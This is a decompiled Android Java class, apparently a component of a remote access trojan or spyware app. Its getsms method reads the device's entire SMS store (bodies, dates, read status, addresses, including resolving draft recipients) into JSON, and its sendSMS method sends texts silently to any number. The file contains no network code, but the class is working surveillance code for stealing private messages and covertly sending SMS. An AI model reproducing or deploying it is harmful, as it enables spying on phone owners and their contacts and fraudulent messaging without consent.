package com.example.project20;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {
    /* JADX DEBUG: Failed to insert an additional move for type inference into block B:36:0x012e */
    public static JSONObject getsms() {
        IllegalArgumentException e;
        JSONException e2;
        JSONObject jSONObject = null;
        try {
            JSONArray jSONArray = new JSONArray();
            JSONObject jSONObject2 = new JSONObject();
            try {
                Uri parse = Uri.parse("content://sms/");
                Context contextOfApplication = MainService.getContextOfApplication();
                Cursor query = contextOfApplication.getContentResolver().query(parse, null, null, null, null);
                if (query.moveToFirst()) {
                    int i = 0;
                    while (i < query.getCount()) {
                        jSONObject2.put("body", query.getString(query.getColumnIndexOrThrow("body")).toString());
                        jSONObject2.put("date", query.getString(query.getColumnIndexOrThrow("date")).toString());
                        jSONObject2.put("read", query.getString(query.getColumnIndexOrThrow("read")).toString());
                        jSONObject2.put("type", query.getString(query.getColumnIndexOrThrow("type")).toString());
                        if (query.getString(query.getColumnIndexOrThrow("type")).toString().equals("3")) {
                            String str = query.getString(query.getColumnIndexOrThrow("thread_id")).toString();
                            ContentResolver contentResolver = contextOfApplication.getContentResolver();
                            Uri parse2 = Uri.parse("content://mms-sms/conversations?simple=true");
                            Cursor query2 = contentResolver.query(parse2, null, "_id =" + str, null, null);
                            if (query2.moveToFirst()) {
                                String str2 = query2.getString(query2.getColumnIndexOrThrow("recipient_ids")).toString();
                                ContentResolver contentResolver2 = contextOfApplication.getContentResolver();
                                Uri parse3 = Uri.parse("content://mms-sms/canonical-addresses");
                                Cursor query3 = contentResolver2.query(parse3, null, "_id = " + str2, null, null);
                                if (query3.moveToFirst()) {
                                    jSONObject2.put("address", query3.getString(query3.getColumnIndexOrThrow("address")).toString());
                                    query3.close();
                                }
                            }
                        } else {
                            jSONObject2.put("address", query.getString(query.getColumnIndexOrThrow("address")).toString());
                        }
                        jSONArray.put(jSONObject2);
                        JSONObject jSONObject3 = new JSONObject();
                        try {
                            query.moveToNext();
                            i++;
                            jSONObject2 = jSONObject3;
                        } catch (IllegalArgumentException e3) {
                            e = e3;
                            jSONObject = jSONObject3;
                            e.printStackTrace();
                            return jSONObject;
                        } catch (JSONException e4) {
                            e2 = e4;
                            jSONObject = jSONObject3;
                            e2.printStackTrace();
                            return jSONObject;
                        }
                    }
                }
                query.close();
                jSONObject2.put("smslist", jSONArray);
                return jSONObject2;
            } catch (IllegalArgumentException e5) {
                e = e5;
                jSONObject = jSONObject2;
                e.printStackTrace();
                return jSONObject;
            } catch (JSONException e6) {
                e2 = e6;
                jSONObject = jSONObject2;
                e2.printStackTrace();
                return jSONObject;
            }
        } catch (IllegalArgumentException e7) {
            e = e7;
            e.printStackTrace();
            return jSONObject;
        } catch (JSONException e8) {
            e2 = e8;
            e2.printStackTrace();
            return jSONObject;
        }
    }

    public static boolean sendSMS(String str, String str2) {
        try {
            SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
